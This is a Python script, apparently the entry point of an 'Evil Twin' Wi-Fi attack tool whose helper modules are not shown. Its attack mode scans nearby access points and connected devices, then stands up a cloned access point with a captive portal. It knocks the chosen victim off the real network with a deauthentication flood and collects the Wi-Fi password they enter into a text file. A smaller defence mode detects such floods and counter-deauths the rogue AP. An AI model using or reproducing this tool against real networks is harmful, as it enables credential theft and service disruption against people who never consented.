import os
import sys
import threading
import time

import Deauthentication as deauth
import AP_Handler as aph
import FakeAP as fap
import Defence as df

W = '\033[0m'  # white
R = '\033[31m'  # red
B = '\033[34m'  # blue
P = '\033[35m'  # purple


def attack():
    # step 1 choose an interface and activate monitor mode
    interface = aph.choose_interface(1)
    aph.activate_monitor(interface)
    # step 2 scan all the access point around and choose one
    ap = aph.APs_scanner(interface)  # [essid, bssid, channel] = [name, mac address, channel]
    # step 3 choose a device that connect to the chosen access point
    device = aph.devices_scanner(interface, ap)  # mac address

    # step 4 activate captive portal
    hotspot_iface = aph.choose_interface(2)
    fap.reset_setting(hotspot_iface)
    fap.fake_AP_setup(hotspot_iface)
    fap.hostapd_conf(hotspot_iface, ap[0])
    fap.dnsmasq_conf(hotspot_iface)
    fap.run_fake_ap(ap[0])

    # step 5 start deauthentication attack
    deauth.deauth_initial(True)
    deauthAttack = threading.Thread(target=deauth.start, args=(interface, ap[1], device))
    deauthAttack.daemon = True
    deauthAttack.start()

    # wait for the target to enter the password
    flag = 0
    while flag == 0:
        try:
            with open('captive_portal/flag.txt') as f:
                flag = int(f.read())
        except:
            flag = 0
        time.sleep(5)
    print(P + "\n*** Target has entered a password you can watch it  at captive_portal/password.txt ***\n" + W)

    fap.remove_conf_files()
    fap.reset_setting(hotspot_iface)

    deauth.deauth_initial(False)
    deauthAttack.join()
    aph.deactivate_monitor(interface)


def defence():
    # step 1 choose an interface and activate monitor mode
    interface = aph.choose_interface(1)
    aph.activate_monitor(interface)
    # step 2 scan all the access point around and choose one to protect
    ap = aph.APs_scanner(interface, 1)  # [essid, bssid, channel] = [name, mac address, channel]
    # step 3: Sniffing the packets and checking for attack.
    attack_detected = df.deauth_detector(interface, ap)
    if attack_detected:
        # step 4 search for malicious AP
        mal_ap = df.APs_scan_duplications(interface=interface, ap=ap)
        # step 5 start deauthentication attack
        deauth.deauth_initial(True)
        deauthAttack = threading.Thread(target=deauth.start, args=(interface, mal_ap[1]))
        deauthAttack.daemon = True
        deauthAttack.start()
        time.sleep(520)
        deauth.deauth_initial(False)
        deauthAttack.join()
        aph.deactivate_monitor(interface)


if __name__ == "__main__":
    if os.geteuid():
        sys.exit(R + 'Please run with root privileges - "sudo python3 Tool.py" ' + W)
    print(P + "Welcome to Evil Twin Tool" + W)
    print(P + "What do you want to do?:\n1. Attack.\n2. Defence" + W)
    choice = input(B + "Choose an option: " + W)
    if choice == "1":
        attack()
    elif choice == "2":
        defence()
    else:
        print(R + "screw you guys." + W)
